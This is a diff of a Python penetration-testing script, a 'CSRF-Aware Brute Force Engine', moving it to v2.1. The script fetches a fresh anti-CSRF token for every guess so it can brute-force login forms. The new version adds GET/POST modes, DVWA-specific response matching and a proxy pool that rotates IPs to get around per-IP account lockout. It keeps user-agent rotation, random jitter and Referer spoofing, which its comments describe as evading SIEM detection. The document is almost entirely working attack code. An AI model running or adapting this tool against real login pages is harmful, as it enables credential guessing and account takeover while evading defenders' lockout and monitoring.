@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-CSRF-Aware Brute Force Engine v2.0
+CSRF-Aware Brute Force Engine v2.1
 ====================================
 A penetration testing tool that bypasses Anti-CSRF token mechanisms
 to perform authenticated brute-force attacks against login forms.
@@ -10,19 +10,19 @@ Framework Alignment: MITRE ATT&CK T1110.001 (Brute Force: Password Guessing)
 
 AUTHORIZED USE ONLY - Ensure written permission before testing.
 
-v2.0 Changes:
-  - Full URL flexibility (no static path appending)
-  - Rich colorized terminal output with box-drawing UI
-  - Results cache with summary table on exit
-  - Graceful Ctrl+C handling with summary display
-  - Signal-safe loop control
+v2.1 Changes:
+  - GET/POST method support (DVWA brute uses GET, login.php uses POST)
+  - Fixed default failure string for DVWA
+  - Proxy rotation from proxy list file (lockout bypass)
+  - Lockout threshold control per proxy
+  - Improved response analysis
 
 Algorithm Steps Implemented:
   1. Session Initialization & State Management
   2. Dynamic Data Retrieval (GET Reconnaissance)
   3. DOM Parsing (Token Extraction)
   4. Payload Construction
-  5. Execution & Evasion (Jitter, UA Rotation)
+  5. Execution & Evasion (Jitter, UA Rotation, Proxy Rotation)
   6. Response Analysis
   7. Reset & Loop (Token Invalidation + Re-fetch)
 """
@@ -36,20 +36,22 @@ import signal
 import argparse
 from datetime import datetime
 from typing import Optional, Tuple, List, Dict
-from urllib.parse import urlparse
+from urllib.parse import urlparse, urlencode, urljoin
+from itertools import cycle
+
+# Suppress InsecureRequestWarning when using proxies
+import urllib3
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 # ============================================================================
 # ANSI Color Constants — Rich Terminal UI
 # ============================================================================
 class C:
     """ANSI escape codes for colorized terminal output."""
-    # Reset
     RST     = "\033[0m"
-    # Styles
     BOLD    = "\033[1m"
     DIM     = "\033[2m"
     ULINE   = "\033[4m"
-    # Foreground
     RED     = "\033[31m"
     GREEN   = "\033[32m"
     YELLOW  = "\033[33m"
@@ -58,32 +60,23 @@ class C:
     CYAN    = "\033[36m"
     WHITE   = "\033[37m"
     GREY    = "\033[90m"
-    # Bright foreground
     BRED    = "\033[91m"
     BGREEN  = "\033[92m"
     BYELLOW = "\033[93m"
     BBLUE   = "\033[94m"
     BMAGENTA= "\033[95m"
     BCYAN   = "\033[96m"
-    # Background
     BG_RED  = "\033[41m"
     BG_GREEN= "\033[42m"
     BG_YELLOW="\033[43m"
+    BG_MAGENTA="\033[45m"
 
-# Box-drawing characters for UI frames
-BOX_TL = "╔"
-BOX_TR = "╗"
-BOX_BL = "╚"
-BOX_BR = "╝"
-BOX_H  = "═"
-BOX_V  = "║"
-BOX_ML = "╠"
-BOX_MR = "╣"
+# Box-drawing characters
+BOX_TL = "╔"; BOX_TR = "╗"; BOX_BL = "╚"; BOX_BR = "╝"
+BOX_H  = "═"; BOX_V  = "║"; BOX_ML = "╠"; BOX_MR = "╣"
 
 # ============================================================================
-# OPSEC: User-Agent Rotation Pool
-# Mimics legitimate browser traffic to evade simple rate-limit filters
-# and SOC/SIEM signature-based detection (MITRE ATT&CK T1036.005)
+# OPSEC: User-Agent Rotation Pool (MITRE ATT&CK T1036.005)
 # ============================================================================
 USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
@@ -103,15 +96,118 @@ USER_AGENTS = [
 
 
 # ============================================================================
+# Proxy Pool — Rotate source IPs to bypass per-IP lockout
+# (MITRE ATT&CK T1090.002 — Proxy: External Proxy)
+# ============================================================================
+class ProxyPool:
+    """
+    Manages a rotating pool of HTTP proxies for IP-based lockout evasion.
+    
+    When the DVWA "Impossible" level locks accounts after N failed attempts
+    per source IP, rotating proxies ensures each IP only burns a limited
+    number of attempts before the script switches to a fresh IP.
+    """
+    
+    def __init__(self, proxy_file: Optional[str] = None, threshold: int = 2):
+        """
+        Args:
+            proxy_file: Path to file with one proxy per line (protocol://ip:port)
+            threshold: Max attempts per proxy before rotating
+        """
+        self.proxies: List[str] = []
+        self.threshold = threshold
+        self._cycle = None
+        self._current_proxy: Optional[str] = None
+        self._current_count = 0
+        self._dead_proxies: set = set()
+        
+        if proxy_file:
+            self._load(proxy_file)
+    
+    def _load(self, filepath: str):
+        """Load proxies from file."""
+        try:
+            with open(filepath, "r") as f:
+                for line in f:
+                    proxy = line.strip()
+                    if proxy and not proxy.startswith("#"):
+                        # Normalize: ensure protocol prefix
+                        if not proxy.startswith(("http://", "https://", "socks")):
+                            proxy = "http://" + proxy
+                        self.proxies.append(proxy)
+        except FileNotFoundError:
+            print(f"  {C.BRED}[!]{C.RST} Proxy file not found: {filepath}")
+            return
+        
+        if self.proxies:
+            random.shuffle(self.proxies)  # Randomize order for OpSec
+            self._cycle = cycle(self.proxies)
+            self._current_proxy = next(self._cycle)
+            self._current_count = 0
+            print(
+                f"  {C.GREEN}[PROXY]{C.RST} Loaded {C.BCYAN}{len(self.proxies)}{C.RST} "
+                f"proxies, rotating every {C.CYAN}{self.threshold}{C.RST} attempts"
+            )
+    
+    @property
+    def is_active(self) -> bool:
+        return len(self.proxies) > 0
+    
+    def get_proxy_dict(self) -> Optional[dict]:
+        """Get the current proxy as a requests-compatible dict."""
+        if not self.is_active or not self._current_proxy:
+            return None
+        return {"http": self._current_proxy, "https": self._current_proxy}
+    
+    def mark_used(self):
+        """Record one attempt on the current proxy. Rotate if threshold hit."""
+        if not self.is_active:
+            return
+        self._current_count += 1
+        if self._current_count >= self.threshold:
+            self._rotate()
+    
+    def mark_dead(self):
+        """Mark current proxy as dead and rotate immediately."""
+        if not self.is_active or not self._current_proxy:
+            return
+        self._dead_proxies.add(self._current_proxy)
+        self._rotate()
+    
+    def _rotate(self):
+        """Switch to the next proxy in the pool."""
+        if not self._cycle:
+            return
+        
+        # Try to find a non-dead proxy (up to pool size attempts)
+        for _ in range(len(self.proxies)):
+            candidate = next(self._cycle)
+            if candidate not in self._dead_proxies:
+                old = self._current_proxy
+                self._current_proxy = candidate
+                self._current_count = 0
+                return
+        
+        # All proxies dead
+        print(f"  {C.BRED}[PROXY]{C.RST} All proxies exhausted!")
+        self._current_proxy = None
+    
+    @property
+    def current(self) -> Optional[str]:
+        return self._current_proxy
+    
+    @property
+    def alive_count(self) -> int:
+        return len(self.proxies) - len(self._dead_proxies)
+
+
+# ============================================================================
 # Results Cache — Tracks all attempts for summary display
 # ============================================================================
 class ResultsCache:
     """
     In-memory cache for all brute-force attempt results.
-    
-    Stores every attempt with its outcome, timing, and HTTP status.
-    On exit (success, Ctrl+C, or exhaustion), prints a formatted
-    summary table showing all caught credentials and statistics.
+    Prints a formatted summary table on exit (success, Ctrl+C, exhaustion).
     """
     
     def __init__(self):
@@ -121,14 +217,7 @@ class ResultsCache:
         self.target_url: str = ""
         self.username: str = ""
     
-    def record_attempt(
-        self,
-        password: str,
-        success: bool,
-        status_code: int,
-        elapsed_ms: float
-    ):
-        """Record a single login attempt result."""
+    def record_attempt(self, password: str, success: bool, status_code: int, elapsed_ms: float):
         entry = {
             "password": password,
             "success": success,
@@ -141,11 +230,6 @@ class ResultsCache:
             self.successes.append(entry)
     
     def print_summary(self):
-        """
-        Print a rich, colorized summary of the attack session.
-        Shows all successful logins if any were caught.
-        Called on success, Ctrl+C interrupt, or wordlist exhaustion.
-        """
         total = len(self.attempts)
         if total == 0:
             print(f"\n{C.YELLOW}  No attempts were made.{C.RST}")
@@ -154,67 +238,61 @@ class ResultsCache:
         elapsed = (datetime.now() - self.start_time).total_seconds() if self.start_time else 0
         success_count = len(self.successes)
         fail_count = total - success_count
+        rate = total / elapsed if elapsed > 0 else 0
         
-        w = 65  # box width
+        w = 65
         
         print()
         print(f"{C.CYAN}{BOX_TL}{BOX_H * (w - 2)}{BOX_TR}{C.RST}")
         print(f"{C.CYAN}{BOX_V}{C.RST}{C.BOLD}{C.BCYAN}  {'SESSION SUMMARY':^{w - 4}}{C.RST}{C.CYAN}{BOX_V}{C.RST}")
         print(f"{C.CYAN}{BOX_ML}{BOX_H * (w - 2)}{BOX_MR}{C.RST}")
         
-        # Stats
-        print(f"{C.CYAN}{BOX_V}{C.RST}  Target       {C.DIM}:{C.RST}  {self.target_url:<{w - 20}}{C.CYAN}{BOX_V}{C.RST}")
-        print(f"{C.CYAN}{BOX_V}{C.RST}  Username     {C.DIM}:{C.RST}  {self.username:<{w - 20}}{C.CYAN}{BOX_V}{C.RST}")
-        print(f"{C.CYAN}{BOX_V}{C.RST}  Total Tries  {C.DIM}:{C.RST}  {total:<{w - 20}}{C.CYAN}{BOX_V}{C.RST}")
-        print(f"{C.CYAN}{BOX_V}{C.RST}  Duration     {C.DIM}:{C.RST}  {elapsed:.1f}s{' ' * (w - 20 - len(f'{elapsed:.1f}s'))}{C.CYAN}{BOX_V}{C.RST}")
+        def row(label, value, color=""):
+            val_str = f"{color}{value}{C.RST}" if color else str(value)
+            # For padding calculation use raw value length
+            raw_len = len(str(value))
+            pad = w - 20 - raw_len
+            if pad < 0:
+                pad = 0
+            print(f"{C.CYAN}{BOX_V}{C.RST}  {label:<12} {C.DIM}:{C.RST}  {val_str}{' ' * pad}{C.CYAN}{BOX_V}{C.RST}")
         
-        fail_str = f"{C.RED}{fail_count}{C.RST}"
-        # We need to account for ANSI codes in padding
-        fail_display = f"{fail_count}"
-        print(f"{C.CYAN}{BOX_V}{C.RST}  Failed       {C.DIM}:{C.RST}  {fail_str}{' ' * (w - 20 - len(fail_display))}{C.CYAN}{BOX_V}{C.RST}")
+        row("Target",     self.target_url[:w - 22])
+        row("Username",   self.username)
+        row("Attempts",   total)
+        row("Duration",   f"{elapsed:.1f}s")
+        row("Rate",       f"{rate:.2f} req/s")
+        row("Failed",     fail_count, C.RED)
+        row("Cracked",    success_count, C.BGREEN if success_count > 0 else C.RED)
         
-        success_str = f"{C.BGREEN}{success_count}{C.RST}"
-        success_display = f"{success_count}"
-        print(f"{C.CYAN}{BOX_V}{C.RST}  Cracked      {C.DIM}:{C.RST}  {success_str}{' ' * (w - 20 - len(success_display))}{C.CYAN}{BOX_V}{C.RST}")
-        
-        if total > 0:
-            rate = total / elapsed if elapsed > 0 else 0
-            rate_str = f"{rate:.2f} req/s"
-            print(f"{C.CYAN}{BOX_V}{C.RST}  Avg Rate     {C.DIM}:{C.RST}  {rate_str:<{w - 20}}{C.CYAN}{BOX_V}{C.RST}")
-        
-        # Successful logins section
         if self.successes:
             print(f"{C.CYAN}{BOX_ML}{BOX_H * (w - 2)}{BOX_MR}{C.RST}")
-            header = "  🔓 CRACKED CREDENTIALS"
-            print(f"{C.CYAN}{BOX_V}{C.RST}{C.BOLD}{C.BGREEN}{header:<{w - 2}}{C.RST}{C.CYAN}{BOX_V}{C.RST}")
+            print(f"{C.CYAN}{BOX_V}{C.RST}{C.BOLD}{C.BGREEN}  🔓 CRACKED CREDENTIALS{' ' * (w - 27)}{C.RST}{C.CYAN}{BOX_V}{C.RST}")
             print(f"{C.CYAN}{BOX_ML}{BOX_H * (w - 2)}{BOX_MR}{C.RST}")
             
             for i, s in enumerate(self.successes, 1):
-                cred_line = f"  [{i}]  {self.username} : {s['password']}"
-                time_str = s['timestamp'].strftime('%H:%M:%S')
-                detail = f"{cred_line:<40} {C.DIM}@ {time_str}{C.RST}"
-                # Padding is tricky with ANSI; just print it
-                print(f"{C.CYAN}{BOX_V}{C.RST}{C.BGREEN}{C.BOLD}  [{i}]{C.RST}  {C.WHITE}{self.username}{C.RST} : {C.BGREEN}{C.BOLD}{s['password']}{C.RST}{C.DIM}  (attempt #{self.attempts.index(s) + 1} @ {time_str}){C.RST}")
+                ts = s['timestamp'].strftime('%H:%M:%S')
+                idx = self.attempts.index(s) + 1
+                print(
+                    f"{C.CYAN}{BOX_V}{C.RST}"
+                    f"  {C.BGREEN}{C.BOLD}[{i}]{C.RST}  "
+                    f"{C.WHITE}{self.username}{C.RST} : "
+                    f"{C.BGREEN}{C.BOLD}{s['password']}{C.RST}"
+                    f"{C.DIM}  (attempt #{idx} @ {ts}){C.RST}"
+                )
         else:
             print(f"{C.CYAN}{BOX_ML}{BOX_H * (w - 2)}{BOX_MR}{C.RST}")
-            no_cred = "  No credentials were cracked."
-            print(f"{C.CYAN}{BOX_V}{C.RST}{C.YELLOW}{no_cred:<{w - 2}}{C.RST}{C.CYAN}{BOX_V}{C.RST}")
+            print(f"{C.CYAN}{BOX_V}{C.RST}{C.YELLOW}  No credentials were cracked.{' ' * (w - 33)}{C.RST}{C.CYAN}{BOX_V}{C.RST}")
         
         print(f"{C.CYAN}{BOX_BL}{BOX_H * (w - 2)}{BOX_BR}{C.RST}")
         print()
 
 
-# Global cache instance and interrupt flag
+# Global state
 _results_cache = ResultsCache()
 _interrupted = False
 
 
 def _signal_handler(signum, frame):
-    """
-    Graceful Ctrl+C handler.
-    Sets the interrupt flag so the loop breaks cleanly,
-    then prints the summary with any caught credentials.
-    """
     global _interrupted
     _interrupted = True
     print(f"\n\n{C.BYELLOW}{C.BOLD}  ⚡ Interrupted by user (Ctrl+C){C.RST}")
@@ -225,75 +303,68 @@ def _signal_handler(signum, frame):
 # Pretty Printer — Colorized per-attempt output
 # ============================================================================
 def print_attempt(
-    attempt_num: int,
-    total: int,
-    username: str,
-    password: str,
-    success: bool,
-    status_code: int,
-    verbose: bool = False
+    attempt_num: int, total: int, username: str, password: str,
+    success: bool, status_code: int, proxy_addr: Optional[str] = None
 ):
-    """
-    Print a single attempt result with rich color coding.
-    
-    PASS  = Red background, indicates failed attempt
-    FOUND = Green background with highlight, indicates cracked credential
-    """
-    # Progress bar
     pct = (attempt_num / total) * 100 if total > 0 else 0
-    bar_width = 20
-    filled = int(bar_width * attempt_num / total) if total > 0 else 0
-    bar = f"{C.GREEN}{'█' * filled}{C.GREY}{'░' * (bar_width - filled)}{C.RST}"
+    bar_w = 20
+    filled = int(bar_w * attempt_num / total) if total > 0 else 0
+    bar = f"{C.GREEN}{'█' * filled}{C.GREY}{'░' * (bar_w - filled)}{C.RST}"
     
     progress = f"{C.DIM}[{attempt_num}/{total}]{C.RST}"
     pct_str = f"{C.DIM}{pct:5.1f}%{C.RST}"
     
+    # Proxy indicator
+    px = ""
+    if proxy_addr:
+        # Show just the IP:port, no protocol
+        short = proxy_addr.replace("http://", "").replace("https://", "").replace("socks5://", "").replace("socks4://", "")
+        px = f" {C.DIM}via {short}{C.RST}"
+    
     if success:
-        # ══════════════ FOUND ══════════════
         tag = f"{C.BG_GREEN}{C.BOLD}{C.WHITE} FOUND {C.RST}"
         cred = f"{C.BGREEN}{C.BOLD}{username}{C.RST} : {C.BGREEN}{C.BOLD}{password}{C.RST}"
         status = f"{C.GREEN}HTTP {status_code}{C.RST}"
-        print(f"  {tag}  {progress} {bar} {pct_str}  {cred}  {status}")
+        print(f"  {tag}  {progress} {bar} {pct_str}  {cred}  {status}{px}")
     else:
-        # ══════════════ PASS ══════════════
         tag = f"{C.BG_RED}{C.WHITE}{C.BOLD} PASS  {C.RST}"
         cred = f"{C.DIM}{username}{C.RST} : {C.WHITE}{password}{C.RST}"
         status = f"{C.DIM}HTTP {status_code}{C.RST}"
-        print(f"  {tag}  {progress} {bar} {pct_str}  {cred}  {status}")
+        print(f"  {tag}  {progress} {bar} {pct_str}  {cred}  {status}{px}")
 
 
 def print_banner(
-    target_url: str,
-    username: str,
-    wordlist_path: str,
-    total_passwords: int,
-    token_name: str,
-    jitter_range: Tuple[float, float],
-    rotate_ua: bool,
-    proxy: Optional[str]
+    target_url: str, username: str, wordlist_path: str,
+    total_passwords: int, token_name: str, method: str,
+    jitter_range: Tuple[float, float], rotate_ua: bool,
+    proxy: Optional[str], proxy_pool: Optional[ProxyPool] = None
 ):
-    """Print a rich startup banner with attack configuration."""
     w = 65
     
     print()
     print(f"{C.MAGENTA}{BOX_TL}{BOX_H * (w - 2)}{BOX_TR}{C.RST}")
-    print(f"{C.MAGENTA}{BOX_V}{C.RST}  {C.BOLD}{C.BMAGENTA}⚔  CSRF-Aware Brute Force Engine v2.0{' ' * (w - 42)}{C.RST}{C.MAGENTA}{BOX_V}{C.RST}")
+    print(f"{C.MAGENTA}{BOX_V}{C.RST}  {C.BOLD}{C.BMAGENTA}⚔  CSRF-Aware Brute Force Engine v2.1{' ' * (w - 42)}{C.RST}{C.MAGENTA}{BOX_V}{C.RST}")
     print(f"{C.MAGENTA}{BOX_V}{C.RST}  {C.DIM}MITRE ATT&CK: T1110.001 | Cyber Kill Chain: Exploitation{' ' * (w - 62)}{C.RST}{C.MAGENTA}{BOX_V}{C.RST}")
     print(f"{C.MAGENTA}{BOX_ML}{BOX_H * (w - 2)}{BOX_MR}{C.RST}")
     
-    # Config lines
     configs = [
         ("Target",     target_url),
+        ("Method",     f"{method} (payload as {'URL params' if method == 'GET' else 'POST body'})"),
         ("Username",   username),
         ("Wordlist",   f"{wordlist_path} ({total_passwords} passwords)"),
         ("Token",      f"{token_name} (auto-refresh per request)"),
         ("Jitter",     f"{jitter_range[0]:.1f}s — {jitter_range[1]:.1f}s"),
         ("UA Rotate",  "Enabled ✓" if rotate_ua else "Disabled ✗"),
-        ("Proxy",      proxy or "Direct connection"),
     ]
     
+    if proxy_pool and proxy_pool.is_active:
+        configs.append(("Proxy Pool", f"{proxy_pool.alive_count} proxies (rotate every {proxy_pool.threshold} attempts)"))
+    elif proxy:
+        configs.append(("Proxy", proxy))
+    else:
+        configs.append(("Proxy", "Direct connection"))
+    
     for label, value in configs:
-        # Truncate long values
         max_val = w - 20
         display = value if len(value) <= max_val else value[:max_val - 3] + "..."
         print(f"{C.MAGENTA}{BOX_V}{C.RST}  {C.CYAN}{label:<12}{C.RST}{C.DIM}:{C.RST} {display}")
@@ -311,22 +382,22 @@ def print_banner(
 def init_session(
     target_url: str,
     proxy: Optional[str] = None,
+    proxy_dict: Optional[dict] = None,
     verbose: bool = False
 ) -> requests.Session:
     """
-    STEP 1: Initialize a persistent HTTP session with the target.
+    STEP 1: Initialize a persistent HTTP session.
     
-    Creates a requests.Session that automatically stores and sends
-    PHPSESSID cookies, maintaining server-side state across requests.
-    This is CRITICAL because CSRF tokens are bound to the session.
+    Establishes PHPSESSID binding with the target server.
+    Supports both single proxy and proxy-pool rotation.
     """
     session = requests.Session()
 
-    if proxy:
-        session.proxies = {"http": proxy, "https": proxy}
+    # Apply proxy settings
+    effective_proxy = proxy_dict or ({"http": proxy, "https": proxy} if proxy else None)
+    if effective_proxy:
+        session.proxies = effective_proxy
         session.verify = False
-        if verbose:
-            print(f"  {C.DIM}[STEP 1] Proxy configured: {proxy}{C.RST}")
 
     session.headers.update({
         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
@@ -336,12 +407,12 @@ def init_session(
         "Upgrade-Insecure-Requests": "1",
     })
 
-    # Extract base URL for initial connection
+    # Extract base URL for initial handshake
     parsed = urlparse(target_url)
     base_url = f"{parsed.scheme}://{parsed.netloc}"
 
     try:
-        init_response = session.get(base_url, timeout=10)
+        init_response = session.get(base_url, timeout=15)
         init_response.raise_for_status()
         cookies = dict(session.cookies)
         print(
@@ -366,18 +437,15 @@ def fetch_csrf_token(
     verbose: bool = False
 ) -> str:
     """
-    STEP 2 + 3: Fetch the login page and extract the fresh CSRF token.
+    STEP 2 + 3: Fetch login page (GET) and extract fresh CSRF token (regex).
     
-    Sends a GET request to retrieve the HTML, then parses the DOM
-    via regex to extract the token value from the hidden input field.
-    
-    The token is DYNAMIC and AUTOMATED — every single call fetches
-    a brand new token from the server. Nothing is static or cached.
-    The username/password fields are NOT checked here; only the
-    CSRF nonce is extracted.
+    Tokens are 100% DYNAMIC and AUTOMATED:
+    - Every call sends a fresh GET request
+    - Regex extracts the new nonce from the hidden input field
+    - Nothing is static or cached between iterations
     """
     try:
-        response = session.get(login_url, timeout=10)
+        response = session.get(login_url, timeout=15)
         response.raise_for_status()
     except requests.RequestException as e:
         if verbose:
@@ -391,25 +459,27 @@ def fetch_csrf_token(
             f"Size: {len(response.text)} bytes"
         )
 
-    # Regex to extract token value from hidden input field
+    # Regex extraction — handles both attribute orderings
     pattern = rf"""<input\s+[^>]*name\s*=\s*['"]?{re.escape(token_name)}['"]?\s+[^>]*value\s*=\s*['"]?([a-fA-F0-9]+)['"]?"""
     match = re.search(pattern, response.text, re.IGNORECASE)
 
     if not match:
-        # Fallback: reversed attribute order (value before name)
         alt_pattern = rf"""<input\s+[^>]*value\s*=\s*['"]?([a-fA-F0-9]+)['"]?\s+[^>]*name\s*=\s*['"]?{re.escape(token_name)}['"]?"""
         match = re.search(alt_pattern, response.text, re.IGNORECASE)
 
     if not match:
+        # Last resort: very loose pattern
+        loose = rf"""name\s*=\s*['"]?{re.escape(token_name)}['"]?[^>]*value\s*=\s*['"]?([a-fA-F0-9]+)['"]?"""
+        match = re.search(loose, response.text, re.IGNORECASE)
+    
+    if not match:
+        loose2 = rf"""value\s*=\s*['"]?([a-fA-F0-9]+)['"]?[^>]*name\s*=\s*['"]?{re.escape(token_name)}['"]?"""
+        match = re.search(loose2, response.text, re.IGNORECASE)
+
+    if not match:
         if verbose:
-            print(
-                f"  {C.BRED}[STEP 3 FAIL]{C.RST} Token '{token_name}' "
-                f"not found in response body"
-            )
-        raise ValueError(
-            f"CSRF token '{token_name}' not found. "
-            "The form structure may have changed."
-        )
+            print(f"  {C.BRED}[STEP 3 FAIL]{C.RST} Token '{token_name}' not found")
+        raise ValueError(f"CSRF token '{token_name}' not found in response.")
 
     token = match.group(1)
     if verbose:
@@ -417,7 +487,6 @@ def fetch_csrf_token(
             f"  {C.CYAN}[STEP 3]{C.RST} Token extracted {C.DIM}|{C.RST} "
             f"{token_name}={token[:8]}...{token[-4:]}"
         )
-
     return token
 
 
@@ -426,28 +495,20 @@ def fetch_csrf_token(
 # ============================================================================
 
 def build_payload(
-    username: str,
-    password: str,
-    csrf_token: str,
+    username: str, password: str, csrf_token: str,
     token_name: str = "user_token",
     extra_params: Optional[dict] = None
 ) -> dict:
-    """
-    STEP 4: Construct the POST payload with credentials and CSRF token.
-    
-    Replicates the exact form submission a legitimate browser would send.
-    """
+    """STEP 4: Build the payload dict with credentials + CSRF token."""
     payload = {
         "username": username,
         "password": password,
         token_name: csrf_token,
     }
-
     if extra_params:
         payload.update(extra_params)
     else:
         payload["Login"] = "Login"
-
     return payload
 
 
@@ -459,24 +520,27 @@ def execute_attempt(
     session: requests.Session,
     login_url: str,
     payload: dict,
+    method: str = "GET",
     jitter_range: Tuple[float, float] = (0.5, 2.0),
     rotate_ua: bool = True,
     verbose: bool = False
 ) -> requests.Response:
     """
-    STEP 5: Execute the login attempt with evasion techniques.
+    STEP 5: Execute the login attempt with evasion.
     
-    OpSec measures:
-    - User-Agent rotation per request
-    - Random jitter delay between requests
-    - Referer header spoofing
+    Supports both GET (DVWA brute page) and POST (login.php) methods.
+    
+    GET mode: payload is sent as URL query parameters
+      → http://target/vulnerabilities/brute/?username=X&password=Y&Login=Login&user_token=Z
+    
+    POST mode: payload is sent in the request body
+      → Used for /login.php and other POST-based forms
     """
-    # Jitter delay — sleep in small increments so Ctrl+C is responsive
+    # Jitter — sleep in small increments for responsive Ctrl+C
     delay = random.uniform(*jitter_range)
     if verbose:
         print(f"  {C.YELLOW}[STEP 5]{C.RST} Jitter: {delay:.2f}s")
     
-    # Sleep in 0.1s increments for responsive interrupt handling
     remaining = delay
     while remaining > 0 and not _interrupted:
         chunk = min(remaining, 0.1)
@@ -486,30 +550,41 @@ def execute_attempt(
     if _interrupted:
         raise KeyboardInterrupt("Interrupted during jitter")
 
+    # UA Rotation
     if rotate_ua:
         session.headers["User-Agent"] = random.choice(USER_AGENTS)
 
+    # Referer spoofing
     session.headers["Referer"] = login_url
 
     try:
-        response = session.post(
-            login_url,
-            data=payload,
-            allow_redirects=False,
-            timeout=10
-        )
+        if method.upper() == "GET":
+            # GET: payload goes as URL query parameters
+            response = session.get(
+                login_url,
+                params=payload,
+                allow_redirects=False,
+                timeout=15
+            )
+        else:
+            # POST: payload goes as form-encoded body
+            response = session.post(
+                login_url,
+                data=payload,
+                allow_redirects=False,
+                timeout=15
+            )
     except requests.RequestException as e:
         if verbose:
-            print(f"  {C.BRED}[STEP 5 FAIL]{C.RST} POST failed: {e}")
+            print(f"  {C.BRED}[STEP 5 FAIL]{C.RST} {method} failed: {e}")
         raise
 
     if verbose:
         print(
-            f"  {C.YELLOW}[STEP 5]{C.RST} POST sent {C.DIM}|{C.RST} "
+            f"  {C.YELLOW}[STEP 5]{C.RST} {method} sent {C.DIM}|{C.RST} "
             f"Status: {response.status_code} {C.DIM}|{C.RST} "
             f"Size: {len(response.text)} bytes"
         )
-
     return response
 
 
@@ -519,62 +594,69 @@ def execute_attempt(
 
 def analyze_response(
     response: requests.Response,
-    failure_string: str = "Login failed",
+    failure_string: str = "Username and/or password incorrect",
     success_path: str = "/dashboard",
     verbose: bool = False
 ) -> bool:
     """
-    STEP 6: Analyze the server's response to determine success/failure.
+    STEP 6: Analyze the server's response.
     
-    Checks HTTP status codes, response body for failure/success strings,
-    and redirect locations.
+    DVWA-specific behavior:
+    - The brute page returns the failure message inline (no redirect)
+    - "Username and/or password incorrect." = FAILED
+    - "Welcome to the password protected area" = SUCCESS
+    - HTTP 302 to success_path = SUCCESS
+    - HTTP 403 = WAF block / account lockout
     """
     status = response.status_code
+    body = response.text.lower()
+    failure_lower = failure_string.lower()
 
+    # WAF / lockout detection
     if status == 403:
         if verbose:
-            print(
-                f"  {C.BRED}[STEP 6]{C.RST} HTTP 403 — "
-                "possible WAF block or account lockout"
-            )
+            print(f"  {C.BRED}[STEP 6]{C.RST} HTTP 403 — WAF block or lockout")
         return False
 
+    # Redirect to authenticated area
     if status in (301, 302):
         location = response.headers.get("Location", "")
-        if success_path in location:
+        if success_path.lower() in location.lower():
             if verbose:
-                print(
-                    f"  {C.BGREEN}[STEP 6]{C.RST} Redirect to {location} — "
-                    "SUCCESS INDICATOR"
-                )
+                print(f"  {C.BGREEN}[STEP 6]{C.RST} Redirect → {location} — SUCCESS")
             return True
 
-    body = response.text
-
-    if failure_string.lower() in body.lower():
+    # Check for explicit failure text
+    if failure_lower in body:
+        return False
+    
+    # Check for lockout message (DVWA Impossible level)
+    if "locked" in body or "too many failed" in body:
+        if verbose:
+            print(f"  {C.BYELLOW}[STEP 6]{C.RST} Account lockout detected in response")
         return False
 
-    # No failure string + HTTP 200 → check for success indicators
-    if status == 200 and failure_string.lower() not in body.lower():
-        success_indicators = ["logout", "sign out", "welcome", "dashboard"]
+    # If we got a 200 and there is NO failure string, check for success indicators
+    if status == 200:
+        success_indicators = [
+            "welcome to the password protected area",
+            "logout", "sign out", "welcome", "dashboard",
+            "you have logged in",
+        ]
         for indicator in success_indicators:
-            if indicator.lower() in body.lower():
+            if indicator in body:
                 if verbose:
-                    print(
-                        f"  {C.BGREEN}[STEP 6]{C.RST} Success indicator "
-                        f"'{indicator}' found in body"
-                    )
+                    print(f"  {C.BGREEN}[STEP 6]{C.RST} Success indicator: '{indicator}'")
                 return True
 
     return False
 
 
 # ============================================================================
-# STEP 7: Reset & Loop (Main Attack Orchestrator)
+# STEP 7: Main Attack Loop
 # ============================================================================
 
 def load_wordlist(filepath: str) -> list:
-    """Load password wordlist from file."""
     passwords = []
     try:
         with open(filepath, "r", encoding="utf-8", errors="replace") as f:
@@ -593,39 +675,35 @@ def run_attack(
     target_url: str,
     username: str,
     wordlist_path: str,
+    method: str = "GET",
     token_name: str = "user_token",
-    failure_string: str = "Login failed",
+    failure_string: str = "Username and/or password incorrect",
     success_path: str = "/dashboard",
     jitter_range: Tuple[float, float] = (0.5, 2.0),
     rotate_ua: bool = True,
     proxy: Optional[str] = None,
+    proxy_file: Optional[str] = None,
+    lockout_threshold: int = 2,
     verbose: bool = False,
     output_file: Optional[str] = None,
 ) -> Optional[str]:
     """
-    STEP 7: Main attack orchestrator — Reset & Loop.
-    
-    Coordinates all 7 steps in sequence:
-      INIT → [GET → Extract token → Build payload →
-              POST → Analyze → Reset token] → LOOP
+    STEP 7: Main attack orchestrator.
     
     Features:
-    - Results cache: every attempt is recorded
-    - Ctrl+C handling: interrupt prints summary with caught creds
-    - Loop break: stops immediately on success
-    - Token refresh: fresh CSRF nonce per iteration (fully automated)
-    
-    The -t/--target parameter is now the FULL attack URL.
-    No path is appended. You control exactly what endpoint gets hit.
+    - GET/POST method support
+    - Results cache with summary on any exit
+    - Ctrl+C graceful handling
+    - Proxy rotation for lockout bypass (Impossible mode)
+    - Per-request CSRF token refresh (fully automated)
     """
     global _interrupted, _results_cache
     _interrupted = False
     
-    # Install signal handler for graceful Ctrl+C
     original_handler = signal.getsignal(signal.SIGINT)
     signal.signal(signal.SIGINT, _signal_handler)
     
-    # The target URL IS the login URL — full flexibility
+    # Normalize URL
     login_url = target_url.rstrip("/")
     if not login_url.startswith("http"):
         login_url = "http://" + login_url
@@ -634,22 +712,22 @@ def run_attack(
     passwords = load_wordlist(wordlist_path)
     total = len(passwords)
     
+    # Initialize proxy pool (for Impossible mode lockout bypass)
+    proxy_pool = ProxyPool(proxy_file, threshold=lockout_threshold) if proxy_file else None
+    
     # Initialize cache
     _results_cache = ResultsCache()
     _results_cache.target_url = login_url
     _results_cache.username = username
     _results_cache.start_time = datetime.now()
     
-    # Print banner
+    # Banner
     print_banner(
-        target_url=login_url,
-        username=username,
-        wordlist_path=wordlist_path,
-        total_passwords=total,
-        token_name=token_name,
-        jitter_range=jitter_range,
-        rotate_ua=rotate_ua,
-        proxy=proxy
+        target_url=login_url, username=username,
+        wordlist_path=wordlist_path, total_passwords=total,
+        token_name=token_name, method=method.upper(),
+        jitter_range=jitter_range, rotate_ua=rotate_ua,
+        proxy=proxy, proxy_pool=proxy_pool
     )
     
     if total == 0:
